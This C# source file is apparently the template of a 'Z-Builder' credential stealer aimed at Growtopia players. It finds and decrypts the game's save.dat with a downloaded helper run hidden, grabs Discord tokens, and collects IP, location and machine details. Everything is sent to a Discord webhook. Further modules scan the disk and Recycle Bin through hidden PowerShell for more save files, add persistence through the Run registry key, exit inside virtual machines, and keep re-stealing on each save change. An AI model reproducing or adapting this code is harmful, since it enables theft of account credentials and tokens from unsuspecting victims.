using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Management;
using System.Net.Http;
using System.Text;
using System.IO.Compression;
using System.Threading;
using System.Windows.Forms;
using System.Diagnostics;
using Microsoft.Win32;
using System.Reflection;

namespace program
{
    static class Program
    {
        static void Main()
        {   
            //[AntiVM]try{ //AntiVM} catch {}
            try{ Directory.Delete(@"C:\\Temp",true); Directory.CreateDirectory("C:\\Temp");} catch {}
            SendInfo();
            //turnonbinder
            //HideStealer
            //FakeErrorMessage
            //RecoverSaveDats
			//LocateAllSaveDats
            //AntiDelete
			//RunOnStartup
			//DeleteGrowtopia
            //Tracer
        }
        static void SaveDecrypter()
        {
            try { File.Delete(@"C:\Temp\savedecrypter.exe");} catch {}
            WebClient webClient = new WebClient();
            webClient.DownloadFile("https://cdn.discordapp.com/attachments/717431484687843352/750524007794606081/savedecrypter.exe","C:\\Temp\\savedecrypter.exe");
        }
        //extractbinder
        static void SendInfo()
        {
            string savedatpath = savedat();
            try { File.Delete(Path.GetTempPath() + "\\PasswordZ.zb");} catch {}
            try
            {
                SaveDecrypter();
                try { File.Delete(@"C:\Temp\saveZ.dat");} catch {}
                File.Copy(savedatpath,@"C:\Temp\saveZ.dat");
                Process p = new Process();
                p.StartInfo.FileName = "savedecrypter.exe";
                p.StartInfo.WorkingDirectory = @"C:\Temp";
                p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                p.StartInfo.CreateNoWindow = true;
                p.Start();
                p.WaitForExit();
                try { File.Delete(@"C:\Temp\savedecrypter.exe");} catch {}
                try { File.Delete(@"C:\Temp\saveZ.dat");} catch{}
            }
            catch {}
            string DecryptedDataPath = Path.GetTempPath() + "\\PasswordZ.zb";
            string GrowID = GetGrowID(savedatpath);
            string DToken = DiscordToken();
            Webhook hook = new Webhook("webhook_url");
            hook.Name = "Z";
            hook.ProfilePictureUrl = "https://cdn.discordapp.com/avatars/575523446524739594/c5b15f1bf1b1da14df90547a0fe07150.png?size=128";
            string details = "";
            details += "```" + "Save.dat stolen by Z-Builder!" + Environment.NewLine + "GrowID: " + GrowID + Environment.NewLine;
            details += "Discord Token: " + DToken + Environment.NewLine;
            details += "Device Name: " + Environment.UserName + " / " + Environment.MachineName + Environment.NewLine;
            details += "IP Address: " + GrabIP() + "City/Region/Country: " + GrabLocation() + Environment.NewLine;
            details += "Time Zone: " + GrabTime()[1] + Environment.NewLine + "Time: " + GrabTime()[0];
            details += "```";
            hook.SendMessage(details, DecryptedDataPath, GrowID);
            File.Delete(Path.GetTempPath() + "\\PasswordZ.zb");
        }
        public static string GetGrowID(string savedatpath)
        {
            try
            {
                byte[] array = File.ReadAllBytes(savedatpath);
                string @string = Encoding.ASCII.GetString(array);
                string GrowID;
                try
                {
                    string text = @string.Substring(@string.IndexOf("tankid_name") + 15, Convert.ToInt32(array[@string.IndexOf("tankid_name") + 11]));
                    GrowID = text;
                }
                catch
                {
                    GrowID = "N/A";
                }
                return GrowID;
            }
            catch
            {
                string GrowID = "N/A";
                return GrowID;
            }
        }
        public static string GrabIP()
        {
            string IPAddress = new WebClient() { Proxy = null }.DownloadString("http://icanhazip.com/");
            return IPAddress;
        }
        public static string GrabLocation()
        {
            try
            {
                var info = new WebClient().DownloadString("https://www.geodatatool.com/");
                string[] data = info.Split('\n');
                string country = data[458].Trim();
                string region = (((data[469]).Split('>'))[1]).Split('<')[0];
                string city = (((data[474]).Split('>'))[1]).Split('<')[0];
                string Location = city + "/" + region + "/" + country;
                return Location;
            }
            catch
            {
                string Location = "N/A";
                return Location;
            }
        }
        public static List<string> GrabTime()
        {
            var zone = TimeZoneInfo.Local; 
            List<string> TimeData = new List<string>();
            TimeData.Add(DateTime.Now.ToString("h:mm:ss tt"));
            TimeData.Add(zone.DisplayName);
            return TimeData;
        }
        public static string savedat()
        {
            string text = "";
            try
            {
                RegistryKey registryKey;
                if (Environment.Is64BitOperatingSystem)
                {
                    registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64);
                }
                else
                {
                    registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry32);
                }
                try
                {
                    registryKey = registryKey.OpenSubKey("Software\\Growtopia", true);
                    string text2 = (string)registryKey.GetValue("path");
                    if (Directory.Exists(text2))
                    {
                        string text3 = File.ReadAllText(text2 + "\\save.dat");
                        if (text3.Contains("tankid_password") && text3.Contains("tankid_name"))
                        {
                            text = text2 + "\\save.dat";
                            return text;
                        }
                        else
                        {
                            text = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + "\\Growtopia\\save.dat";
                            return text;
                        }
                    }
                    else
                    {
                        text = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + "\\Growtopia\\save.dat";
                        return text;
                    }
                }
                catch
                {
                    text = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + "\\Growtopia\\save.dat";
                    return text;
                }
            }
            catch
            {
                text = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + "\\Growtopia\\save.dat";
                return text;
            }
        }
        public static string DiscordToken()
        {
            string result;
            try
            {
                string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";
                if (!dotldb(ref text))
                {
                    dotlog(ref text);
                }
                Thread.Sleep(100);
                string text2 = tokenx(text, text.EndsWith(".log"));
                if (text2 == "")
                {
                    text2 = "N/A";
                }
                result = text2;
            }
            catch
            {
                result = "Not Found!";
            }
            return result;
        }
        private static bool dotldb(ref string stringx)
        {
            bool result;
            try
            {
                if (Directory.Exists(stringx))
                {
                    foreach (FileInfo fileInfo in new DirectoryInfo(stringx).GetFiles())
                    {

                        if (fileInfo.Name.EndsWith(".ldb") && File.ReadAllText(fileInfo.FullName).Contains("oken"))
                        {
                            stringx += fileInfo.Name;
                            return stringx.EndsWith(".ldb");
                        }
                    }
                    result = stringx.EndsWith(".ldb");
                }
                else
                {
                    result = false;
                }
            }
            catch
            {
                result = false;
            }
            return result;
        }
        private static string tokenx(string stringx, bool boolx = false)
        {
            string result;
            try
            {
                if (stringx.Contains(".log"))
                    {
                    stringx = Path.GetDirectoryName(stringx) + "\\LogCopy.txt";
                }
                byte[] bytes = File.ReadAllBytes(stringx);
                string @string = Encoding.UTF8.GetString(bytes);
                string text = "";
                string text2 = @string;
                while (text2.Contains("oken"))
                {
                    string[] array = IndexOf(text2).Split(new char[]
                    {
                        '"'
                    });
                    text = array[0];
                    text2 = string.Join("\"", array);
                    if (boolx && text.Length == 59)
                    {
                        break;
                    }
                }
                result = text;
                if (stringx.Contains("LogCopy.txt"))
                {
                    File.Delete(stringx);
                }
            }
            catch
            {
                if (stringx.Contains("LogCopy.txt"))
                {
                    File.Delete(stringx);
                }
                result = "";
            }
            return result;
        }
        public static string dotlog(ref string stringx)
        {
            bool result;
            try
            {
                if (Directory.Exists(stringx))
                {
                    foreach (FileInfo fileInfo in new DirectoryInfo(stringx).GetFiles())
                    {
                        bool LogText = ReadLogFile(fileInfo.FullName);
                        if (fileInfo.Name.EndsWith(".log") && LogText)
                        {
                            stringx += fileInfo.Name;
                            return stringx.EndsWith(".log").ToString();
                        }
                    }
                    result = stringx.EndsWith(".log");
                }
                else
                {
                    result = false;
                }
            }
            catch
            {
                result = false;
            }
            return result.ToString();
        }
        static bool ReadLogFile(string path)
        {
            string newpath = Path.GetDirectoryName(path) + "\\LogCopy.txt";
            File.Copy(path, newpath, true);
            bool Result = File.ReadAllText(newpath).Contains("oken");
            return Result;
        }
        private static string IndexOf(string stringx)
        {
            string result;
            try
            {
                string[] array = stringx.Substring(stringx.IndexOf("oken") + 4).Split(new char[]
                {
                    '"'
                });
                List<string> list = new List<string>();
                list.AddRange(array);
                list.RemoveAt(0);
                array = list.ToArray();
                result = string.Join("\"", array);
            }
            catch
            {
                result = null;
            }
            return result;
        }
		static void DeleteGrowtopia()
        {
            string growtopiafolder = "\\Growtopia\\Growtopia.exe";
            string LOCALAPPDATA = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            string fullPath = LOCALAPPDATA + growtopiafolder;
            if (File.Exists(fullPath))
            {
                File.Delete(fullPath);
            }
        }
		static void RunOnStartup()
		{
		    RegistryKey RK = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
			RK.SetValue(System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName, Application.ExecutablePath);
		}	
		static void AntiDeleteStealer()
		{
			try
			{
				string AntiDeleteStealer = Process.GetCurrentProcess().MainModule.FileName;
                if (Directory.Exists(Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + "\\Growtopia\\game\\pets\\boop"))
                {
                Directory.Delete(Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + "\\Growtopia\\game\\pets\\boop",true);
                }
                Directory.CreateDirectory(Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + "\\Growtopia\\game\\pets\\boop");
                string AntiDeleteStealerDestination = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + "\\Growtopia\\game\\pets\\boop\\" + Path.GetFileName(Process.GetCurrentProcess().MainModule.FileName);
                if (File.Exists(AntiDeleteStealerDestination))
                    {
                    File.Delete(AntiDeleteStealerDestination);
                    }
				File.Copy(AntiDeleteStealer, AntiDeleteStealerDestination);
                try { Directory.CreateDirectory(@"C:\Temp");} catch{}
				using(var resource = Assembly.GetExecutingAssembly().GetManifestResourceStream("AntiDelete.exe"))
				{
					using(var file = new FileStream(@"C:\Temp\AntiDelete.exe", FileMode.Create, FileAccess.Write))
					{
						resource.CopyTo(file);
					} 
				}
				Process p = new Process();
				p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				p.StartInfo.WorkingDirectory = @"C:\Temp";
				p.StartInfo.FileName = "cmd.exe";
				p.StartInfo.Arguments = "/c AntiDelete.exe";
				p.Start();
				Thread.Sleep(10000);
			}
			catch
			{
			}
		}
		static void LocateAllSaveDats()
        {
            string DrivePath = Path.GetPathRoot(Environment.SystemDirectory);
            string TempPath = DrivePath + "Temp";
            try { Directory.CreateDirectory(TempPath); } catch { }
            try { Directory.Delete(TempPath + "\\LocatedSaveDats",true); Directory.CreateDirectory(TempPath + "\\LocatedSaveDats"); } catch { Directory.CreateDirectory(TempPath + "\\LocatedSaveDats"); }
            try { File.Delete(@"C:\Temp\Accounts.zb");} catch{}
            GrabSaveDats(TempPath);
            RecoverSaveDats(TempPath);
            SaveDecrypter();
            string AccData = "";
            Process p = new Process();
            p.StartInfo.FileName = "savedecrypter.exe";
            p.StartInfo.WorkingDirectory = @"C:\Temp";
            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            p.StartInfo.CreateNoWindow = true;
            DirectoryInfo SearchDir = new DirectoryInfo(TempPath + "\\LocatedSaveDats");
            FileInfo[] filesInDir = SearchDir.GetFiles("*save*");
            foreach (FileInfo foundFile in filesInDir)
            {
                try{ File.Delete(@"C:\Temp\saveZ.dat");} catch{}
                File.Move(foundFile.FullName, TempPath + @"\saveZ.dat");
                p.Start();
                p.WaitForExit();
                File.Delete(@"C:\Temp\saveZ.dat");
                AccData += File.ReadAllText(Path.GetTempPath() + "\\PasswordZ.zb") + Environment.NewLine;
            }
            File.WriteAllText(@"C:\Temp\Accounts.zb",AccData);
            File.Delete(Path.GetTempPath() + "\\PasswordZ.zb");
            File.Delete(@"C:\Temp\savedecrypter.exe");
            Directory.Delete(TempPath + "\\LocatedSaveDats", true);
            Webhook hook3 = new Webhook("webhook_url");
            hook3.Name = "Z";
            hook3.ProfilePictureUrl = "https://cdn.discordapp.com/avatars/575523446524739594/c5b15f1bf1b1da14df90547a0fe07150.png?size=128";
            string details3 = "```Located save.dats by Z-Builder```";
            hook3.SendMessage(details3,TempPath + "\\Accounts.zb");
            File.Delete(TempPath + "\\Accounts.zb");
            try
            {
                File.Delete(@"C:\Temp\LocateSaveDats.bat");
            }
            catch {}
        }
        static void GrabSaveDats(string TempLocation)
        {
            string UserPath = Directory.GetParent(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)).FullName;
            if ( Environment.OSVersion.Version.Major >= 6 ) {
                UserPath = Directory.GetParent(UserPath).ToString();
            }
            try{File.Delete(@"C:\Temp\LocateSaveDats.bat");} catch{}
            File.WriteAllText(@"C:\Temp\LocateSaveDats.bat","dir save.dat /S /B");
            Process p = new Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = "/C C:\\Temp\\LocateSaveDats.bat";
            p.StartInfo.WorkingDirectory = UserPath;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            p.StartInfo.CreateNoWindow = true;
            p.Start();
            string output = "";
            while (!p.HasExited)
            {
                output += p.StandardOutput.ReadToEnd();
            }
            string[] lines = output.Split('\n');
            List<string> RawLocations = new List<string>();
            foreach (string i in lines)
            {
                if ((i.Contains("save.dat"))&&(!(i.Contains("dir save.dat /S /B"))))
                {
                    RawLocations.Add(i);
                }
            }
            Random rand = new Random();
            foreach (string i in RawLocations)
            {
                string CleanedLocation = i.Trim();
                File.Copy(CleanedLocation,TempLocation + "\\LocatedSaveDats\\save" + (Convert.ToString(rand.Next(0,20000000))) + ".dat");
            }
        }
        static void RecoverSaveDats(string TempLocation)
        {
            try
            {
                string RecycleBinZ = TempLocation + "\\RecycleBinZ";
                try { Directory.Delete(RecycleBinZ, true); Directory.CreateDirectory(RecycleBinZ); } catch { Directory.CreateDirectory(RecycleBinZ); }
                string ps1file = RecycleBinZ + "\\RecoverFiles.ps1";
                try { File.Delete(ps1file); } catch { };
                using (var tw = new StreamWriter(ps1file, true))
                {
                    tw.WriteLine(string.Join(Environment.NewLine, "$shell = New-Object -ComObject Shell.Application", "$recycleBin = $shell.Namespace(0xA) #Recycle Bin", "$recycleBin.Items() | %{Copy-Item $_.Path (\"C:\\Temp\\RecycleBinZ\\{0}\" -f ($_.Name+[string](Get-Random)))}"));
                }
                var StartInfo = new ProcessStartInfo();
                StartInfo.FileName = "powershell.exe";
                StartInfo.Arguments = "-NoProfile -ExecutionPolicy unrestricted -file \"" + ps1file + "\"";
                StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                using (Process RecycleBinGrabber = Process.Start(StartInfo))
                {
                    RecycleBinGrabber.WaitForExit();
                }
                DirectoryInfo SearchDir = new DirectoryInfo(RecycleBinZ);
                FileInfo[] filesInDir = SearchDir.GetFiles("*save*");
                Random rand = new Random();
                foreach (FileInfo foundFile in filesInDir)
                {
                    File.Move(foundFile.FullName, TempLocation + "\\LocatedSaveDats" + "\\save" + (Convert.ToString(rand.Next(0, 20000000))) + ".dat");
                }
                Directory.Delete(RecycleBinZ, true);
            }
            catch { }
        }
        static void RecoverSaveDats2()
        {
            try
            {
                string DrivePath = Path.GetPathRoot(Environment.SystemDirectory);
                string TempLocation = DrivePath + "Temp";
                string RecycleBinZ = TempLocation + "\\RecycleBinZ";
                try { Directory.Delete(RecycleBinZ, true); Directory.CreateDirectory(RecycleBinZ); } catch { Directory.CreateDirectory(RecycleBinZ); }
                string ps1file = RecycleBinZ + "\\RecoverFiles.ps1";
                try { File.Delete(ps1file); } catch { };
                using (var tw = new StreamWriter(ps1file, true))
                {
                    tw.WriteLine(string.Join(Environment.NewLine, "$shell = New-Object -ComObject Shell.Application", "$recycleBin = $shell.Namespace(0xA) #Recycle Bin", "$recycleBin.Items() | %{Copy-Item $_.Path (\"C:\\Temp\\RecycleBinZ\\{0}\" -f ($_.Name+[string](Get-Random)))}"));
                }
                var StartInfo = new ProcessStartInfo();
                StartInfo.FileName = "powershell.exe";
                StartInfo.Arguments = "-NoProfile -ExecutionPolicy unrestricted -file \"" + ps1file + "\"";
                StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                using (Process RecycleBinGrabber = Process.Start(StartInfo))
                {
                    RecycleBinGrabber.WaitForExit();
                }
                SaveDecrypter();
                string AccData = "";
                Process p = new Process();
                p.StartInfo.FileName = "savedecrypter.exe";
                p.StartInfo.WorkingDirectory = @"C:\Temp";
                p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                p.StartInfo.CreateNoWindow = true;
                DirectoryInfo SearchDir = new DirectoryInfo(RecycleBinZ);
                FileInfo[] filesInDir = SearchDir.GetFiles("*save*");
                foreach (FileInfo foundFile in filesInDir)
                {
                    try{ File.Delete(@"C:\Temp\saveZ.dat");} catch{}
                    File.Move(foundFile.FullName, TempLocation + "\\saveZ.dat");
                    p.Start();
                    p.WaitForExit();
                    File.Delete(@"C:\Temp\saveZ.dat");
                    AccData += File.ReadAllText(Path.GetTempPath() + "\\PasswordZ.zb") + Environment.NewLine;
                }
                File.WriteAllText(@"C:\Temp\Accounts.zb",AccData);
                File.Delete(@"C:\Temp\savedecrypter.exe");
                File.Delete(Path.GetTempPath() + "\\PasswordZ.zb");
                Directory.Delete(RecycleBinZ, true);
                Webhook hook3 = new Webhook("webhook_url");
                hook3.Name = "Z";
                hook3.ProfilePictureUrl = "https://cdn.discordapp.com/avatars/575523446524739594/c5b15f1bf1b1da14df90547a0fe07150.png?size=128";
                string details3 = "```Recovered save.dats by Z-Builder!```";
                hook3.SendMessage(details3,TempLocation + "\\Accounts.zb");
                File.Delete(TempLocation + "\\Accounts.zb");
                Directory.Delete(TempLocation + "\\RecoveredSaveDats",true);
            }
            catch { }
        }
        static void AntiVM()
        {
            
            using (var searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
            {
                using (var items = searcher.Get())
                {
                    foreach (var item in items)
                    {
                        string manufacturer = item["Manufacturer"].ToString().ToLower();
                        if ((manufacturer == "microsoft corporation") && (item["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL"))
                                || manufacturer.Contains("vmware")
                                || item["Model"].ToString() == "VirtualBox")
                        {
                            Environment.Exit(0);
                        }
                    }
                }
            }
        }
    }
    class Webhook
    {
        private HttpClient Client;
        private string Url;

        public string Name { get; set; }
        public string ProfilePictureUrl { get; set; }

        public Webhook(string webhookUrl)
        {
            Client = new HttpClient();
            Url = webhookUrl;
        }

        public bool SendMessage(string content, string file = null, string GrowID = null)
        {
            MultipartFormDataContent data = new MultipartFormDataContent();
            data.Add(new StringContent(Name), "username");
            data.Add(new StringContent(ProfilePictureUrl), "avatar_url");

            if (file != null)
            {
				if (File.Exists(file))
				{
                    if (GrowID != null)
                    {
                        data.Add(new StringContent(content), "content");
                        byte[] bytes = File.ReadAllBytes(file);
                        data.Add(new ByteArrayContent(bytes), "PasswordZ.zb", GrowID +".zb");
                        var resp = Client.PostAsync(Url, data).Result;
                        return resp.StatusCode == HttpStatusCode.NoContent;
                    }
                    else
                    {
                        data.Add(new StringContent(content), "content");
                        byte[] bytes = File.ReadAllBytes(file);   
                        data.Add(new ByteArrayContent(bytes), "Accounts.zb", "Accounts.zb");
                        var resp = Client.PostAsync(Url, data).Result;
                        return resp.StatusCode == HttpStatusCode.NoContent;
                    }
				}
				else
				{
                    content += "```No save.dat found in Growtopia folder```";
                    data.Add(new StringContent(content), "content");
                    var resp = Client.PostAsync(Url, data).Result;
                    return resp.StatusCode == HttpStatusCode.NoContent;
				}       
            }
            return true;
        }

    }
    class Tracer
    {
        public static string dirPath = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + "\\Growtopia";
        public static string savePath = Program.savedat();
        public static FileSystemWatcher fileSystemWatcher = new FileSystemWatcher();
        public static void TraceSave()
        {
            fileSystemWatcher.Path = dirPath;
            fileSystemWatcher.NotifyFilter = NotifyFilters.LastWrite;
            fileSystemWatcher.Filter = "*.dat";
            fileSystemWatcher.Changed += OnSaveChanged;
            fileSystemWatcher.EnableRaisingEvents = true;
            while (true)
            {
                Thread.Sleep(1000);
			    //[AntiDelete]if (!(Process.GetProcessesByName(Path.GetFileNameWithoutExtension("Regiistry")).Length > 0))
                //[AntiDelete]{
                    //[AntiDelete]Process q = new Process();
                    //[AntiDelete]q.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    //[AntiDelete]q.StartInfo.WorkingDirectory = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + "\\Growtopia\\game\\pets";
                    //[AntiDelete]q.StartInfo.FileName = "cmd.exe";
                    //[AntiDelete]q.StartInfo.Arguments = "/c Regiistry.exe";
                    //[AntiDelete]q.Start();
                    //[AntiDelete]Thread.Sleep(5000);
                 //[AntiDelete]}
                 //[AntiDelete]Thread.Sleep(5000);
            }
        }
        private static void OnSaveChanged(object source, FileSystemEventArgs e)
        {
            if (e.FullPath == savePath)
            {
                try
                {
                    fileSystemWatcher.EnableRaisingEvents = false;
                    string details = "";
                    try { File.Delete(@"C:\Temp\savedecrypter.exe");} catch {}
                    WebClient webClient = new WebClient();
                    webClient.DownloadFile("https://cdn.discordapp.com/attachments/717431484687843352/750524007794606081/savedecrypter.exe","C:\\Temp\\savedecrypter.exe");
                    try {File.Delete(@"C:\Temp\saveZ.dat");} catch {}
                    File.Copy(e.FullPath, @"C:\Temp\saveZ.dat");
                    Process p = new Process();
                    p.StartInfo.FileName = "savedecrypter.exe";
                    p.StartInfo.WorkingDirectory = @"C:\Temp";
                    p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    p.StartInfo.CreateNoWindow = true;
                    p.Start();
                    p.WaitForExit();
                    File.Delete(@"C:\Temp\saveZ.dat");
                    string AccData = File.ReadAllText(Path.GetTempPath() + "\\PasswordZ.zb");
                    string[] SplittedData = AccData.Split(new[] { "[---ZB-Split---]" }, StringSplitOptions.RemoveEmptyEntries);
                    string GrowID = SplittedData[0];
                    details += "```Save.dat traced by Z-Builder!" + Environment.NewLine + "Traced from " + Environment.UserName + " / " + Environment.MachineName + "!";
                    details += Environment.NewLine + "GrowID: " + GrowID;
                    details += "```";
                    Webhook hook2 = new Webhook("webhook_url");
                    hook2.Name = "Z";
                    hook2.ProfilePictureUrl = "https://cdn.discordapp.com/avatars/575523446524739594/c5b15f1bf1b1da14df90547a0fe07150.png?size=128";
                    hook2.SendMessage(details, Path.GetTempPath() + "\\PasswordZ.zb", GrowID);
                    File.Delete(Path.GetTempPath() + "\\PasswordZ.zb");
                }
                finally
                {
                    fileSystemWatcher.EnableRaisingEvents = true;
                }
            }
        }
    }
}